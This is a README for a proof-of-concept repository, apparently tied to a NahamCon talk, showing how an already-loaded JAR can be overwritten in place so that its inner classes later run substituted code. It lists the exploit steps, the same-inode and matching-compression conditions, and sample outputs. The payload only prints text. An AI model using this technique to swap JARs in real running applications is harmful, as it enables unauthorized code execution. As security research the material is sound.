# URLClassLoader hot jar swapping

The following example code shows the ability to hot jar swap an already loaded JAR-file and get code execution by abusing the fact that inner classes still access the JAR file when invoked.

Tested on MacOS with OpenJDK (And also exploited on Apple's Author publisher using Transporter).

Demo from Frans Rosén's talk "Story of a RCE on Apple through hot jar swapping" from NahamCon 2022 EU.

## How to run

### `build-and-run.sh`

You run it with:

```
./build-and-run.sh
```

This will:

```
Compile HelloWorld/*.java into HelloWorld.jar
Compile Bootstrapper/*.java into Bootstrapper.jar
Make a copy of HelloWorld.jar into OrigHelloWorld.jar
Run Bootstrapper.jar
```

Bootstrapper will load and run the `HelloWorld.Main`-class using URLClassLoader and will prompt you to run the method `hello` from the `HelloWorld.Secondary`-class that has also already been loaded. This is to control when to replace the JAR that has already been loaded.

```
$ ./build-and-run.sh 
Hello from Main-class
Click enter when you want to trigger the secondary class method
(run ./exploit.sh to replace JAR)
```

You can now decide if you want to click enter without replacing any JAR, this will show the proper code flow from `HelloWorld/Secondary.java`:

```
Hello from secondary class, here are all files in testdir/

testdir/hej
testdir/hej123

This is from the legit postVisitDirectory function:
testdir

End of run, goodbye
```

### `exploit.sh`

The `exploit.sh` will:

```
Compile Exploit/HelloWorld/*.java and move *.class files over to BuildDirForExploit/
Compile a exploit.jar from BuildDirForExploit/-dir
Compare the exploit.jar and OrigHelloWorld.jar using unzip -lv
Tell you if there's a diff or not based on size, compression rate and compression size
Copy exploit.jar over the existing HelloWorld.jar regardless if there's a difference or not
```

The copying part when overwriting HelloWorld.jar with exploit.jar is important, because if the inode changes the exploit will not succeed. A `mv` command will write a new inode, but `cp` into an existing file will not. The same thing happened using the ZIP-extract, the inode of the already existing JAR never changed, allowing the exploit to work.

If you want to test the hot JAR swapping, run the `exploit.sh` in a different window after you run but before you click enter when calling `build-and-run.sh`:

```
$ ./build-and-run.sh 
Hello from Main-class
Click enter when you want to trigger the secondary class method
(run ./exploit.sh to replace JAR)

## Run this in a different terminal:

$ ./exploit.sh 

NO DIFF IN COMPRESSION, EXPLOIT WILL SUCCEED

-rw-r--r--  1 frans  staff  2281 Dec  9 13:20 rce.jar
-rw-r--r--@ 1 frans  staff  2281 Dec  9 13:20 ../HelloWorld.jar

## Now click enter in the other tab to complete the ./build-and-run.sh)
```

If you now click enter on `./build-and-run.sh` you should successfully see the replaced code instead:

```
Hello from secondary class, here are all files in testdir/

testdir/hej
testdir/hej123
AAAAAAAFGFFFFAAAGAAAAFAAAAAFFFFFAAAFA different code
testdir

End of run, goodbye
```

Showing that we can abuse the fact that inner/anonymous-classes are still being loaded from the physical JAR-file even if the URLClassLoader has already loaded the JAR from before we replaced it.

## Explanation of the issue

This code repo tries to explain that you are able to overwrite already loaded JAR-files to get code execution under a few pre-requisites.

The idea is that the JAR was initially loaded with URLClassLoader:

```
        URL[] classLoaderUrls = new URL[]{new URL("file://" + System.getProperty("user.dir") + "/HelloWorld.jar")};
        URLClassLoader urlClassLoader = new URLClassLoader(classLoaderUrls);
        Class<?> beanClass = urlClassLoader.loadClass("HelloWorld.Main");
        Constructor<?> constructor = beanClass.getConstructor();
        Object beanObj = constructor.newInstance();
        Method method = beanClass.getMethod("hello");
```

And a secondary method was also loaded on boot but never invoked:

```
        // Initiating the secondary class on boot, this is the one we replace the inner class of
        Class<?> secondaryClass = urlClassLoader.loadClass("HelloWorld.Secondary");
        Constructor<?> secondaryConstructor = secondaryClass.getConstructor();
        Object secondaryObj = secondaryConstructor.newInstance();
        Method secondaryMethod = secondaryClass.getMethod("hello");
```

If the JAR is then replaced while the app is running, and the class that was loaded but never had any methods invoked also has inner classes, we're able to make it run different code from the new JAR if the invocation happens later:

```
        // Invoke secondary class hello that contains an inner class
        secondaryMethod.invoke(secondaryObj);
```

So if this method contains an inner-class (They show up in the JAR as `$1.class`) and we replace the inner-class with something with the same size and compression rate, we're able to hot swap the JAR and get our own code to run.

## Explanation of the exploit

The anonymous class from the file `Exploit/HelloWorld/Secondary.java` compiles into the inner class `Exploit/HelloWorld/Secondary$1.class` which has the same size and compression rate as when `HelloWorld/Secondary.java` gets compiled and compressed. If the size or compression rate would differ, you would get a crash when clicking enter in `build-and-run.sh`.
So if you would change `Exploit/HelloWorld/Secondary.java` to for example (`functionn` instead of `function:`):

```
          public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
            System.out.println("\nThis is from the legit postVisitDirectory functionn");
            System.out.println(dir);
            return FileVisitResult.CONTINUE;
          }
```

Where the compression result is the same but the compression rate is wrong:

```
$ ./exploit.sh 
6c6
< 1430 643 55% HelloWorld/Secondary$1.class
---
> 1430 644 55% HelloWorld/Secondary$1.class
DIFF IN COMP, EXPLOIT WILL CRASH
-rw-r--r--  1 frans  staff  2280 Dec  9 13:44 exploit.jar
-rw-r--r--@ 1 frans  staff  2281 Dec  9 13:44 ../HelloWorld.jar
```

you would see:

```
Hello from Main-class
Click enter when you want to trigger the secondary class method
(run ./exploit.sh to replace JAR)

Hello from secondary class, here are all files in testdir/

Exception in thread "main" java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at Bootstrapper.Main.main(Main.java:38)
Caused by: java.lang.NoClassDefFoundError: HelloWorld/Secondary$1
	at HelloWorld.Secondary.hello(Secondary.java:11)
	... 5 more
Caused by: java.lang.ClassNotFoundException: HelloWorld.Secondary$1
	at java.net.URLClassLoader.findClass(URLClassLoader.java:387)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
	... 6 more
```

On OpenJDK it seems like if the original size differ but the compression size is the same it still works:

```
          public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
            System.out.println("AAAADDAAAAAAAAAFFAAAAAAAAAAAAAFFAAAAGGAAGGAAAGPTAAFPFAFPAPA");
            System.out.println(dir);
            return FileVisitResult.CONTINUE;
          }
```

```
$ ./exploit.sh 
6c6
< 1437 644 55% HelloWorld/Secondary$1.class
---
> 1430 644 55% HelloWorld/Secondary$1.class
9c9
< 2895 45% 5
---
> 2888 45% 5
DIFF IN COMP, EXPLOIT WILL CRASH
-rw-r--r--  1 frans  staff  2281 Dec  9 13:52 exploit.jar
-rw-r--r--@ 1 frans  staff  2282 Dec  9 13:52 ../HelloWorld.jar
```

```
Hello from secondary class, here are all files in testdir/

testdir/hej
testdir/hej123
AAAADDAAAAAAAAAFFAAAAAAAAAAAAAFFAAAAGGAAGGAAAGPTAAFPFAFPAPA
testdir
```

The `exploit.sh` will still say it's a difference as it might not work in all versions.

You will also see that if you change things in `Exploit/HelloWorld/Secondary.java` outside of the inner-class, such as:

```
System.out.println("\nEnd of run, goodbye");
```

into:

```
System.out.println("\nEnd of run, goodbya");
```

which will make the `Secondary.class` be the same compression rate and size, it will still not trigger the replaced content, since the class is already loaded by URLClassLoader, confirming that this is only affecting inner-classes (the ones named `$1.class` in the JAR) since they are loaded from the JAR-file when used:

```
End of run, goodbye
```
